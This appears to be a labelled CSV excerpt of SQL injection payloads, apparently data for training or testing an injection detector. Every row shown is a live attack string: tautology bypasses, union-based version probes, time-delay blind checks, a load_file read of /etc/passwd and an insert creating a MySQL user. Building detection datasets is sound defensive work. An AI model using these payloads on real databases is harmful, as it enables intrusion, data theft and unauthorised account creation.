row_index,payload_norm,label,sqli_type_hint
120,"select * from users where id = 1 ||1 union select 1,banner from v$version where rownum = 1 -- 1",1,
121,"select * from users where id = 1 <@$$ union select 1,version ( ) -- 1",1,
122,"admin"" ) or ( ""1"" = ""1",1,
123,"select * from users where id = 1 or 1#""@ union select 'a',version ( ) -- 1",1,
124,"1 ) or benchmark ( 10000000,MD5 ( 1 ) ) #",1,
125,"select * from users where id = 1 union select .1_,version ( ) -- 1",1,
126,AND 1 = utl_inaddr.get_host_address ( ( SELECT SYS.DATABASE_NAME FROM DUAL ) ) AND 'i' = 'i,1,
127,select * from users where id = 1 %$ 1 or 1 = 1 -- 1,1,
128,select * from users where id = 1 %!<@ or 1 = 1 -- 1,1,
129,"; if not ( substring ( ( select @@version ) ,25,1 ) <> 0 ) waitfor delay '0:0:2' --",1,
130,1 ) or sleep ( __TIME__ ) #,1,
131,"select * from users where id = 1 or ""1_"" or 1 = 1 -- 1",1,
132,"select * from users where id = 1 <1## union select 1,version ( ) -- 1",1,
133,"select * from users where id = 1 + $+*\ union select null,@@VERSION -- 1",1,
134,select * from users where id = 1. <@ or 1 = 1 -- 1,1,
135,or true--,1,
136,; execute immediate 'sel' || 'ect us' || 'er',1,
137,hi' or 'x' = 'x';,1,
138,select * from users where id = 1 <@ or 1 = 1 -- 1,1,
139,"select * from users where id = 1 or "".,"" or 1 = 1 -- 1",1,
140,admin' #,1,
141,"select * from users where id = 1 <@$_ union select 1,version ( ) -- 1",1,
142,"select * from users where id = 1 or "", ( "" or 1 = 1 -- 1",1,
143,"select * from users where id = 1 or "",{"" or 1 = 1 -- 1",1,
144,"union select 1,load_file ( '/etc/passwd' ) ,1,1,1;",1,
145,""" ) ;waitfor delay '0:0:__TIME__'--",1,
146,"insert into mysql.user ( user, host, password ) values ( 'name', 'localhost', password ( 'pass123' ) )",1,
147,"admin"" or ""1"" = ""1""/*",1,
148,"select * from users where id = 1 or ""1 ( "" = 1 or 1 = 1 -- 1",1,
149,"select * from users where id = 1 or \<1 union select 1,@@VERSION -- 1",1,
